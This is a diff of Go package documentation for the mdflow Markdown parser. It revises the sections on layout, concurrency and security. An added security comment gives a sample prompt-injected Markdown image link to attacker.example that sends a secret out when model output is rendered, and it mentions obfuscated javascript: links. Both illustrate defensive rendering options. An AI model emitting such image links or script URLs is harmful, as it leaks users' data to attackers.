@@ -12,7 +12,7 @@
 //	renderer/html   the HTML implementation
 //	extension       the capability seam: syntax paired with the output it produces
 //	extension/*      each capability in its own module (table, math, ...)
-//	mdflow          facade: composition, chaining, streaming, fan-out
+//	mdflow          facade: composition, chaining, streaming
 //
 // Dependencies point strictly downward, and none of them is a type assertion in
 // disguise: an extension configures output through the capability interfaces in
@@ -83,7 +83,7 @@
 // # Functional style
 //
 // The event stream is an [iter.Seq], so it composes with ordinary Go. The
-// generic combinators (iterx.Map, iterx.Filter, iterx.Reduce, iterx.Collect,
+// generic combinators (iterx.Map, iterx.Filter, iterx.Reduce,
 // iterx.Take, ...) live in package [github.com/Wenrh2004/mdflow/iterx] as free
 // functions, because Go does not permit type parameters on methods.
 //
@@ -99,14 +99,12 @@
 // predicate — table.IsTable, math.IsMath — while [Tagged] and [TaggedLeaf] build
 // one for any tag, including one your own capability defines.
 //
-// # Parallelism
+// # Concurrency
 //
-// Block structure is inherently sequential. Once that phase is complete and
-// reference definitions are sealed, inline parsing uses one immutable resolver
-// and can distribute across closed leaves. [Parser.Workers] fans it across
-// cores — 1.45x at 175 KiB, 2.0x at 2 MiB, for +5-23% memory. It is opt-in, and
-// falls back to sequential below 16 KiB or when a middleware chain is installed.
-// See [Parser.Workers] for the measured trade-off.
+// A [Parser] is immutable and safe for concurrent use, so the way to use many
+// cores is many documents at once through one shared Parser. There is no
+// within-document parallel mode: block structure is sequential, and the inline
+// phase that could fan out is now too small a share of the work to pay for it.
 //
 // # Supported syntax
 //
@@ -125,7 +123,13 @@
 // through as written, and because destinations are entity-decoded before output
 // an obfuscated java&#115;cript: reaches the renderer as javascript: too. Pass
 // [WithSafeLinks] to filter destinations to an http/https/mailto/tel/relative
-// allowlist when rendering untrusted input.
+// allowlist when rendering untrusted input, and [WithURLPolicy] with
+// html.AllowImageHosts to stop model output from loading remote images — the
+// channel a prompt-injected ![](https://attacker.example/?q=secret) leaks
+// data through.
+//
+// Output is linear in input on every profile: reference expansion and GFM
+// table padding are budgeted, as in cmark and cmark-gfm.
 //
 // GFM tables, strikethrough and task lists, and the Memos math, hashtag,
 // typography and wiki-resource syntax live under extension/. Task lists are
